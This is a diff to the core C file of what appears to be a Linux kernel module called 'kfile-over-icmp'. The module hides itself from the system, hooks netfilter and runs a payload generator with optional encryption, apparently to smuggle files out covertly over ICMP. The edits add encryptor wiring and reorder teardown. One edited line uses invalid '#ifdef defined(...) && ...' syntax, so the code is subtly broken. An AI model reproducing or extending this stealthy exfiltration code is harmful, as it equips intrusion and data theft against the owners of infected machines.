@@ -5,23 +5,30 @@
 #include "chrdev/chrdev.h"
 #include "fs/payload_generator.h"
 
+#ifdef CONFIG_ENCRYPT_FILE
+#include "utils/modifiers/encryptor.h"
+#endif
+
 static const char* input_chrdev_name = "kinput";
 static int input_chrdev_major_num;
 
 void add_payload_generator_modifier_functions(void)
 {
-#ifdef CONFIG_COMPRESS_FILE
-#endif
-
 #ifdef CONFIG_ENCRYPT_FILE
-#include "utils/modifiers/encryptor.h"
-payload_generator_add_modifier(&encrypt_data);
+    payload_generator_add_modifier(&encrypt_data);
+#endif
+}
+
+void remove_payload_generator_modifier_functions(void)
+{
+#ifdef CONFIG_ENCRYPT_FILE
+    payload_generator_remove_modifier(&encrypt_data);
 #endif
 }
 
 int core_start(void)
 {
-#ifdef CONFIG_HIDE_MODULE
+#ifdef defined(CONFIG_HIDE_MODULE) && !defined(DEBUG)
     hide_module();
     printk(KERN_DEBUG "kfile-over-icmp: module hidden successfully.\n");
 #endif
@@ -53,14 +60,15 @@ int core_start(void)
 
 void core_stop(void)
 {
+    // Remove netfilter hook
+    unregister_nf_hook();
+    printk(KERN_DEBUG "kfile-over-icmp: netfilter hook removed\n");
+
     // Remove our character device
     unregister_input_chrdev(input_chrdev_major_num, input_chrdev_name);
     printk(KERN_DEBUG "kfile-over-icmp: sucessfully unregistered character device\n");
 
+    remove_payload_generator_modifier_functions();
     stop_payload_generator_thread();
     printk(KERN_DEBUG "kfile-over-icmp: stopped payload generator thread\n");
-
-    // Remove netfilter hook
-    unregister_nf_hook();
-    printk(KERN_DEBUG "kfile-over-icmp: netfilter hook removed\n");
 }
